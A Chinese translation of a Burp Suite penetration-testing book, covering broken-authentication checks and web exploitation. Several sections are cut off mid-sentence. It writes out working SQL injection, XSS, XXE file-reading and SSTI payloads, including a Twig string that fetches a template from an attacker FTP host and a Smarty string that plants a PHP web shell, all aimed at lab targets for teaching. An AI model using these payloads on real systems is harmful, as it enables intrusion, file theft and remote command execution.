破损的身份验证是影响应用程序的一组问题。其中一些列在这里：

+   凭证的弱存储

+   可预测的登录凭证

+   会话 ID 暴露在 URL 中

+   会话 ID 容易受到会话固定攻击的影响

+   错误的超时实现

+   会话在注销后没有被销毁

+   通过不受保护的渠道发送的敏感信息

我们将解释如何使用 Burp Suite 检测这些问题。

# 检测凭证的弱存储

关于身份验证的信息存在一个大问题；它不仅存储在服务器端，还需要存储在客户端，也许不是以用户名和密码的形式，而是以令牌、会话 ID 或应用程序用于跟踪用户和提供访问的其他形式。

使用 Burp Suite，可以分析这些信息存储在哪里。例如，将信息存储在 cookie 中是非常常见的，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/503cde25-98b5-459b-8f07-2b5f1be6b455.png)

这是基本身份验证的一个例子，这是内部应用程序常用的身份验证方法。这种方法的一个大问题是，它将凭证以 base64 形式存储到标头中，因此任何有权访问标头的人都可以获取密码，并将其解码为明文。

这不是唯一的问题；还有一些应用程序直接存储凭证。例如，看下面的请求：

```
POST /userinfo.php HTTP/1.1 
Host: testphp.vulnweb.com 
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 
Accept-Language: en-US,en;q=0.5 
Accept-Encoding: gzip, deflate 
Referer: http://testphp.vulnweb.com/login.php 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 20 
Connection: close 
Cookie: admin:admin 
Upgrade-Insecure-Requests: 1 

id=1 
```

在这里，我们可以直接看到每个客户端请求发送到应用程序的凭证。

还有其他安全的地方可以存储凭证。例如，在移动应用程序的情况下，通常使用内部或外部设备存储中的文件，这些文件由应用程序读取。

关键是要使用代理工具理解应用程序的流程，以确定应用程序如何接收凭证以及工具对其进行了什么操作，使用了什么方法，它们存储在哪里，是否被重用，以及应用程序用于跟踪用户的什么类型的令牌或跟踪 ID。

# 检测可预测的登录凭证

一些应用程序使用可预测的登录，这意味着恶意用户可以猜测下一个或上一个已注册的用户名。例如，想象一下，一个在线银行使用账号作为其应用程序的用户名；恶意用户可以创建一个可能的账号列表，这些账号大多是连续的，以猜测用户名。

检测这种漏洞的一个很好的工具是 Intruder，它在 Payloads 部分，并有一个创建连续列表的选项，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/0e8b3dd1-20ae-4574-8984-90e581bf863c.png)

此外，还可以创建连续的日期，甚至...

# 会话 ID 暴露在 URL 中

这不是一个很常见的问题，但过去有很多应用程序在 URL 中添加会话 ID。例如，看下面的截图：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/afa87037-4e4c-405f-9840-1370a6355476.png)

一旦检测到用于存储会话 ID 的变量，就可以应用过滤器来检测 URL 中的所有会话。

看下一张截图。在这里，扫描器检测到了一个令牌，Burp Suite 列出了所有暴露的令牌：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/b17f74d6-b334-43ed-ab75-df83142cff0c.png)

# 会话 ID 容易受到会话固定攻击的影响

当应用程序只使用一个 ID 来跟踪会话时的主要问题是，这个 ID 可以被用来窃取会话。例如，如果你使用 Burp Suite 代理工具，你可以拦截发送会话 ID 的请求。这个会话 ID 只为一个用户创建。例如，看下面的请求：

```
GET /login.php HTTP/1.1 
Host: 192.168.1.67 
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 
Accept-Language: en-US,en;q=0.5 
Accept-Encoding: gzip, deflate 
Connection: close 
Cookie: HPSESSID=784uaocq9lb6uthqcc259imks1 
Upgrade-Insecure-Requests: 1 
```

现在，使用另一个...

# 超时实施

要检测这个问题，你不需要使用 Burp Suite 这样的工具；只需打开应用程序，登录，并等待知道自动关闭会话需要多长时间。像在线银行这样的应用程序需要按照合规要求在一定时间内关闭会话。

在一段时间后关闭会话是一个好主意；在用户窃取了会话的情况下，可以减少对应用程序的影响。

# 在注销后会话没有被销毁

要检查应用程序是否正确关闭了会话，使用 Burp Suite 打开应用程序，然后使用有效的凭据登录应用程序：

1.  如你从以下截图中所见，应用程序创建了一个作为访客用户使用的会话：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/2b5aa0f0-bfc8-4843-9f4d-844b82f3cdbb.png)

1.  现在，访问应用程序，你会发现应用程序现在创建了一个新的会话作为已登录用户。

1.  关闭会话，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/24ecc360-64b8-4de6-8a47-12e04fd2ca74.png)

1.  如果应用程序正确销毁了会话，就不可能重新发送请求。前往...

# 总结

在本章中，我们回顾了如何检测特定的漏洞。在上一章中，通过检测模式来检测漏洞，而在这种情况下，漏洞需要更多关于应用程序流程的理解。

本章中解释的缺陷可以用来获取敏感信息，突破授权和认证，并成为更大妥协的一部分。在下一章中，我们将利用 Burp 工具和扩展来利用不同类型的漏洞。


# 第八章：利用 Burp Suite 进行漏洞利用-第 1 部分

Burp Suite 是一个优秀的工具，用于检测漏洞。正如我们在之前的章节中所看到的，它有各种各样的工具和选项，当然还有扩展，可以帮助我们在查找应用程序中的漏洞时更加准确和高效。然而，Burp Suite 也有选项来帮助我们利用漏洞，生成关于利用的证据，并在需要时重现利用。

在本章中，我们将检查如何利用 Burp Suite 的选项以及在某些情况下使用工具和扩展来利用不同类型的漏洞。本章将涵盖以下主题：

+   通过盲布尔型基于布尔的数据泄露...

# 通过盲布尔型基于布尔的 SQL 注入进行数据泄露

SQL 注入是基于输入验证错误的漏洞，允许恶意用户将意外的 SQL 语句插入应用程序以执行不同的操作。例如，提取信息，删除数据或修改原始语句。

有三种类型的 SQL 注入，如下所示：

+   带内 SQL 注入：这种类型的 SQL 注入具有可以使用发送语句的相同通道进行分析的特点。这意味着由数据库管理系统（DBMS）生成的响应是在相同的分析应用程序中接收的。

+   推断性：这种类型的 SQL 注入与前一种不同，因为在应用程序的响应中无法看到错误或结果。我们需要推断应用程序后端发生了什么，或者使用外部通道获取信息。同时，推断性 SQL 注入进一步分为两种类型：

+   基于布尔的盲 SQL 注入：在这种类型的 SQL 注入中，语句集中于改变应用程序中的布尔值以获得不同的响应。即使 SQL 注入结果没有直接显示，HTTP 响应内容也可能会改变以推断结果。

+   基于时间的盲 SQL 注入：这种推断性 SQL 注入取决于数据库服务器生成响应所经过的时间。通过时间变化，可以推断 SQL 注入是否成功。为此，恶意用户插入包含在 DBMS 中的函数，以确定后端发生了什么。

+   盲注 SQL 注入：在这种类型的 SQL 注入中，不可能使用相同的通道来查看错误响应或直接推断结果。因此，我们需要使用外部通道来知道 SQL 注入是否成功。例如，使用第二个数据存储来接收结果，比如使用 DNS 解析来推断请求中经过的时间，这是在应用程序中无法看到的。

我们将看到如何使用 Burp Suite 来利用基于布尔的 SQL 注入漏洞。

# 漏洞

分析以下 PHP 代码片段：

```
ini_set('display_errors', 0); 
$connection = $GLOBALS['connection']; 

$id = ($_POST['id']); 

$query_statement = "SELECT * from polls where id = ".$id; 
$result = $conection->query($query_statement); 
if ($result->num_rows > 0 ){ 
   while($row = $result->fetch_assoc()){ 
         echo "<p class=''>Thank you for your response!</p>"; 
   } 
} 
```

这段代码使用`$id`变量，这是一个数字，将信息传递给直接在数据库中执行的查询中的`SELECT`语句。`$id`变量用于`WHERE`表达式，以查找用户传递的确切`$id`变量，并根据变量`$id`中的数字仅显示过滤后的信息。

关于最重要的事情...

# 利用

假设这个数据库只有 10 条记录，所以如果用户将数字`1`作为值传递给`$id`变量，应用程序将返回第一条记录。当用户输入数字`10`时，应用程序将返回最后一条记录。然而，当用户输入值`11`时，应用程序没有记录可以显示，但它也不显示任何错误来解释为什么不显示任何内容，因为没有更多内容可以显示。输出什么也不做。

由于应用程序未验证输入到`$id`变量的值，用户可以输入任何类型的信息。例如，`'1`或`1=1--`字符串，这是用于检测 SQL 注入漏洞的常见字符串。但是，正如我们所说，应用程序不会显示错误。

忘记应用程序不显示错误，为什么可以输入`'1`或`1=1--`这样的字符串？我们将在这里给出的流程中看到：

1.  当用户输入`'1`或`1=1--`字符串时，这个字符串被转换为一个真值，应用程序将其解释为数字`1`，因此应用程序返回第一个注册。

1.  如果我们传递一个超出 1 到 10 的值会发生什么？如果我们将数字`11`传递给`$id`变量，`WHERE`条件将尝试查找第 11 个注册，但由于缺少，`$query_statement`变量将不会有一个存储在其中的注册。当 PHP 代码中的以下`if`语句验证存储在`$query_statement`变量中的注册时，应用程序将失败。

1.  我们知道，当应用程序接收到 1 到 10 之间的数字时，应用程序将工作；而且，我们知道当结果是 1 到 10 之间的数字时，我们可以传递任意语句。牢记这一点，如果我们传递`11-1`值是有效的。

1.  *11-1*的结果是*10;*因此，当`WHERE`条件验证`$id`值时，它将有一个数字`10`，因此应用程序将显示最后一个值。这是利用此漏洞的关键！

现在，使用更复杂的语句，如下：

```
11-(select case when '0'='0' then 1 else 0 end) 
```

这个声明产生了最终的数字`10`作为值传递给`$id`；现在，还要考虑以下声明：

```
11- (select case when 'a'=(substring((select 'abcd'),1,1)) then 1 else 0 end) 
```

前面的声明产生了相同的结果。因此，两者都可以被接受，由后端执行而不显示结果。此外，如果我们生成一个被执行的语句，但最终值不是 1 到 10，错误将不会显示。

有了这个声明作为基础，我们可以使用 Burp Suite 在以下部分执行数据外泄。

# 使用 Burp Suite 进行数据外泄

执行以下步骤使用 Burp Suite 执行数据外泄：

1.  首先，配置 Burp Suite 以拦截应用程序发出的请求，并在发送`$id`值的请求时停止，使用代理选项卡中的`拦截打开`选项，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/7d73c09d-beb0-4fd2-bed4-0c91dc130a42.png)

1.  请求停止后，右键单击它，然后选择发送到入侵者选项，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/76beb704-7156-48fa-a156-2c3ac0ee617d.png)

默认情况下，Burp Suite 为请求中检测到的每个变量创建通配符，并创建值...

# 使用 SQL 注入执行操作系统命令

SQL 注入攻击最严重的影响之一是在操作系统级别执行命令。大多数情况下，如果用户执行系统命令，这将导致整个服务器和应用程序被攻破。

# 漏洞

SQL 注入中的命令注入漏洞通常发生是因为 DBMS 具有存储过程或允许的本地选项，直接与操作系统交互。例如，在 SQL Server 上的`xp_cmdshell`，或者为 Oracle 开发的特殊存储过程。

在某些情况下，应用程序还可能存储通过查询提取并执行的数据库字符串；因此，如果我们可以更新数据库，我们可以向服务器注入命令。但是，正如我提到的，这不是常见情况。

一旦我们发现与命令注入相关的漏洞，我们可以使用 Burp Suite 来利用它。例如，让我们检查应用程序的以下请求：

这个请求是...

# 执行带外命令注入

正如我们已经多次提到的那样，Burp Suite 最重要的功能是自动化能力。正如我们将在本书的后面探讨的那样，我们可以创建自己的插件来扩展 Burp Suite，或者我们可以找到社区制作的许多扩展。

有一个名为**SHELLING**的扩展，专注于为命令注入攻击创建有效负载列表。我们将在下一节更仔细地研究这个问题。

# SHELLING

SHELLING 是一个在 BApps Store 中不可用的插件，因此您需要转到 GitHub 获取它[`github.com/ewilded/shelling`](https://github.com/ewilded/shelling)。下载`.jar`文件并使用 Burp Suite 中的 Extender 选项安装它：

1.  要做到这一点，点击 Extender 选项卡，然后点击手动安装按钮。Burp Suite 将启动一个窗口来选择`.jar`文件。因为 SHELLING 不是官方扩展的一部分，Burp Suite 将启动以下警告消息以确认您是否要安装它：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/44863719-cf5f-417a-8360-5325e87e9f49.png)

1.  安装完成后，您在 Burp Suite 实例上看不到任何不同之处。这是因为 SHELLING 不会修改...

# 利用 XSS 窃取会话凭据

XSS 是一种可以用于许多目的的漏洞。它会弹出一个消息框，以控制受 XSS 影响的计算机。常见的攻击是利用 XSS 窃取凭据或会话。

# 利用漏洞

想象一下，我们有以下易受攻击的请求，其中`name`参数容易受到 XSS 攻击：

```
GET /dvwa/vulnerabilities/xss_r/?name=cosa HTTP/1.1 
Host: 192.168.1.72 
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 
Accept-Language: en-US,en;q=0.5 
Accept-Encoding: gzip, deflate 
Referer: http://192.168.1.72/dvwa/vulnerabilities/xss_r/ 
Connection: close 
Cookie: security=low; PHPSESSID=3nradmnli4kg61llf291t9ktn1 
Upgrade-Insecure-Requests: 1 
```

您可以使用 Burp Suite 的代理捕获它，并使用常见的测试字符串修改参数的值，如下所示：

```
<script>alert(1)</script> 
```

退出拦截...

# 利用 XSS 控制用户的浏览器

正如我之前提到的，XSS 的最大影响可能是控制受影响的用户。

这基本上取决于 Web 浏览器允许使用 JavaScript 或其他客户端交互执行操作的操作方式，这些操作方式可以通过 XSS 由恶意用户传递。实际上，不需要直接执行 JavaScript。例如，可以在 Internet Explorer 中利用 XSS 执行 ActiveX 控件，如下所示：

```
<script> 
   var o=new ActiveXObject("WScript.shell"); 
   o.Run("program.exe") 
</script> 
```

此代码将在远程计算机中启动另一个程序，因此可以在客户端执行任何类型的攻击。

# 利用 XXE 漏洞提取服务器文件

XXE 是一种影响解析 XML 并在解析具有对 XXE 的引用时出现错误的应用程序的漏洞。

# 利用漏洞

想象一下，我们有一个容易受到 XXE 漏洞影响的应用程序，其中我们有一个易受攻击的请求，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/edf64d0e-2897-44bd-ba3f-273484aa6940.png)

在这里，`xml`参数容易受到 XXE 的影响，如下面的块所示：

```
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 
```

这意味着这是一个接受 XML 作为输入的请求。因此，我们将使用 Burp Suite 的代理修改输入，以查看应用程序是否接受我们的测试字符串。为此，我们将使用以下输入：

```
<!DOCTYPE foo [ <!ELEMENT  ANY> <!ENTITY bar "cosa">  <!ENTITY barxee "&amp;bar; XEE" > ]> <foo> &amp;barxee; </foo> 
```

如果被接受，应用程序将显示我们在 XML 输入中传递的消息。因此，使用此输入修改`xml`参数，并点击拦截以发送请求。结果将显示在 HTML 网站中，如下所示：

```
</div> 

<div class="container"> 

Hello   

cosa 
      <footer> 
        <p>&amp;copy; PentesterLab 2013</p> 
      </footer> 
```

现在，我们知道漏洞是可利用的，所以我们将发送一个字符串来从服务器中提取文件。要使用 XXE 攻击提取文件，我们需要更多关于托管应用程序的服务器的信息，至少是操作系统。使用响应中包含的标头，可以知道操作系统是什么，如下所示：

```
HTTP/1.1 200 OK 
Date: Sat, 16 Feb 2019 21:17:10 GMT 
Server: Apache/2.2.16 (Debian) 
X-Powered-By: PHP/5.3.3-7+squeeze15 
X-XSS-Protection: 0 
Vary: Accept-Encoding 
Content-Length: 1895 
Connection: close 
Content-Type: text/html 
X-Pad: avoid browser bug 
```

如果您怀疑，可以使用网络工具（如 Nmap ([www.nmap.org](http://www.nmap.org)））来确认，此标头可能会被系统管理员修改。

在这种情况下，服务器是 Debian Linux。因此，我们需要使用符合类 Unix 文件系统的测试字符串进行攻击，如下所示：

```
<!DOCTYPE foo  [<!ENTITY bar SYSTEM "file:///etc/passwd">]> <foo>&amp;bar;</foo> 
```

使用这个，我们将检索`/etc/passwd`文件，在某些情况下，它们作为密码哈希值存储在 Linux 系统中。因此，将原始请求发送到 Repeater 工具，使用此字符串修改`xml`参数，并单击“Go”，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/920f6273-fd0f-4598-a157-f208a61c373f.png)

目前，并非所有的 Linux 系统都使用`/etc/passwd`文件来存储哈希值；过去，作为渗透测试人员，呈现类似前面的截图是展示漏洞风险的完美证据。然而，如今有很多 Linux 系统将它们的哈希值存储在`/etc/shadow`中，该文件是加密的，或者在许多情况下，限制了服务器用户对文件系统的访问。

根据应用程序的上下文，您需要确定要提取哪些文件。例如，作为提示，从 Web 服务器的根目录中提取文件非常有用，以便访问源代码。

# 使用 XXE 和 Burp Suite collaborator 执行过时数据提取

Burp Suite collaborator 是一个用于检测漏洞的服务，主要是当应用程序尝试与外部服务进行交互时。Burp Suite 分析与外部系统的交互并检测异常行为。为了分析应用程序，Burp Suite collaborator 向应用程序发送输入或有效载荷，并等待响应。

因此，在这种情况下，Burp Suite 正在工作一个服务器，应用程序使用常见服务进行交互，如 DNS、SMTP 或 HTTP。

# 使用 Burp Suite 来利用漏洞

在主仪表板选项卡中打开 Burp Suite，单击“新扫描”选项，如下截图所示。请记住，这些选项仅在 Burp Suite 专业版中可用，而不在社区版中可用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/d50fcee4-b164-4b3a-86a0-151c17dc7bf3.png)

当您使用扫描器 Burp Suite 测试应用程序的漏洞时，您可以修改有关扫描器工作方式的选项，并配置用于自动登录的凭据。这对于大多数应用程序来说非常重要，因为它们大多数都有身份验证控制。为了利用 XXE，我们将对我们拥有的 URL 进行简单的扫描。单击“确定”按钮后，扫描开始。

当扫描完成时，Burp Suite 将在 URL 中显示检测到的 XXE，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/ecac7d4c-b9d6-4e75-8c63-14a0b90f3727.png)

在上述列表中，我们可以看到一些包含短语“External service interaction”的问题，后面跟着使用的协议。如果我们选择其中一个问题，Burp Suite 将显示一个名为 Collaborator interaction 的新选项卡，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/56410108-9297-44e2-a71b-231c63537bbd.png)

Burp Suite collaborator 允许用户配置自己的服务器，但如果您没有配置一个，collaborator 将默认使用 Portswigger 的服务器。通过分析请求，我们可以检测到 collaborator 发送了以下参数：

```
GET /xml/example1.php?xml=%3c!DOCTYPE%20test%20[%3c!ENTITY%20%25%20j27pf%20SYSTEM%20%22http%3a%2f%2fdgxknwuc7fqeysa0w53lpzt2wt2mqceb22psdh.burpcollaborator.net%22%3e%25j27pf%3b%20]%3e%3ctest%3ehacker%3c%2ftest%3e HTTP/1.1 
Host: 192.168.1.66 
Accept-Encoding: gzip, deflate 
Accept: */* 
Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36 
Connection: close 
Cache-Control: max-age=0 
```

响应如下：

```
    <div class="container"> 
Hello   

Warning: simplexml_load_string(): http://dgxknwuc7fqeysa0w53lpzt2wt2mqceb22psdh.burpcollaborator.net:1: parser error : internal error in /var/www/xml/example1.php on line 4 

Warning: simplexml_load_string(): <html><body>zz4z85vbr0640exz8e6wvvzjlgigrgjfigz</body></html> in /var/www/xml/example1.php on line 4 

Warning: simplexml_load_string(): ^ in /var/www/xml/example1.php on line 4 

Warning: simplexml_load_string(): http://dgxknwuc7fqeysa0w53lpzt2wt2mqceb22psdh.burpcollaborator.net:1: parser error : DOCTYPE improperly terminated in /var/www/xml/example1.php on line 4 

Warning: simplexml_load_string(): <html><body>zz4z85vbr0640exz8e6wvvzjlgigrgjfigz</body></html> in /var/www/xml/example1.php on line 4 

Warning: simplexml_load_string(): ^ in /var/www/xml/example1.php on line 4 

Warning: simplexml_load_string(): http://dgxknwuc7fqeysa0w53lpzt2wt2mqceb22psdh.burpcollaborator.net:1: parser error : Start tag expected, '<' not found in /var/www/xml/example1.php on line 4 

Warning: simplexml_load_string(): <html><body>zz4z85vbr0640exz8e6wvvzjlgigrgjfigz</body></html> in /var/www/xml/example1.php on line 4 

Warning: simplexml_load_string():  ^ in /var/www/xml/example1.php on line 4 
      <footer> 
        <p>&amp;copy; PentesterLab 2013</p> 
      </footer> 
```

collaborator 使用一个字符串来识别漏洞。如果我们审查 collaborator 的请求和响应，而不是 HTTP 请求，它是不同的。我们可以看到使用的字符串如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/8d0908f5-3088-4842-80fb-ecd98349801d.png)

阅读响应中的 HTML 代码，我们可以找到以下字符串：

```
Warning: simplexml_load_string(): <html><body>zz4z85vbr0640exz8e6wvvzjlgigrgjfigz</body></html> in /var/www/xml/example1.php on line 4 
```

# 利用 SSTI 漏洞执行服务器命令

SSTI 是一种漏洞，当应用程序使用框架来显示其呈现给用户的方式时发生。这些模板是输入，如果这些输入没有得到正确验证，它们可能会改变行为。

这些漏洞在很大程度上取决于开发人员用来创建应用程序的技术，因此并非所有情况都相同，作为渗透测试人员，您需要识别这些差异以及其对漏洞利用的影响。

# 使用 Burp Suite 来利用这个漏洞

假设您有一个易受 SSTI 攻击的应用程序正在使用 Twig。Twig ([`twig.symfony.com/`](https://twig.symfony.com/)) 是一个在 PHP 中开发的模板引擎。

我们可以通过源代码检测引擎的使用。考虑以下代码片段：

```
var greet = 'Hello $name'; 
<ul> 
<% for(var i=0; i<data.length; i++) 
{%> 
<li><%= data[i] %></li> 
<% } 
%> 
</ul> 
<div> 
<p> Welcome, {{ username }} </p> 
</div> 
```

在这里，我们可以看到应用程序正在等待数据以向用户呈现最终网站。当 PHP 读取模板时，它会执行其中包含的所有内容。例如，2015 年，James Kettle 发布了一个漏洞，允许使用以下字符串在 Twig 中注入后门：

```
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}} 
```

遵循相同的思路，可以使用以下字符串执行任何命令，甚至获取 shell：

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}} 
uid=1000(k) gid=1000(k) groups=1000(k),10(wheel) 
```

这是因为在代码中，可以注入任何 PHP 函数，而不需要验证。Kettle 在源代码中展示了漏洞，如下所示：

```
public function getFilter($name){ 
[snip] 
   foreach ($this->filterCallbacks as $callback) { 
         if (false !== $filter = call_user_func($callback, $name)) { 
               return $filter; 
         } 
   } 

   return false; 
} 
public function registerUndefinedFilterCallback($callable){ 
   $this->filterCallbacks[] = $callable; 
} 
```

基本上，该代码接受任何类型的 PHP 函数，因此，在字符串中，Kettle 输入了`exec()`函数来直接向服务器执行命令。

Twig 并不是唯一存在问题的引擎。Kettle 研究的其他引擎包括 Smarty，另一个 PHP 引擎，理论上不允许直接使用`system()`函数。然而，Kettle 发现它允许调用其他类中的方法。

易受攻击的代码片段如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/e83a91da-a8ce-4c53-a9f9-6ff3a3ce96d4.png)

在这段代码片段中，我们可以看到`getStreamVariable()`方法可能容易读取任何文件，具体取决于服务器权限。此外，我们还可以调用其他方法。

因此，为了在服务器上执行命令，Kettle 向我们展示了以下测试字符串：

```
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ? 
>",self::clearConfig())} 
```

我们可以在`$_GET`变量中添加命令。

在 Burp Suite 中，我们可以将这些测试字符串添加到不同模板引擎的列表中，然后使用 Intruder 工具中的负载选项发动攻击，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-app-pentest-bpst/img/499cb38c-972e-45a5-8f4d-6961fb673c3b.png)

# 总结

在本章中，我们学习了 Burp Suite 用于利用不同类型漏洞的常规工具。特别是，我们探讨了盲 SQL 注入、OS 命令注入、利用 XSS、利用 XSS 窃取会话、利用 XSS 控制 Web 浏览器、利用 XXE、利用 XXE 从服务器提取文件以及通过模板引擎利用 SSTI。

在下一章中，我们将利用其他类型的漏洞，展示 Burp Suite 中更多的选项和功能。
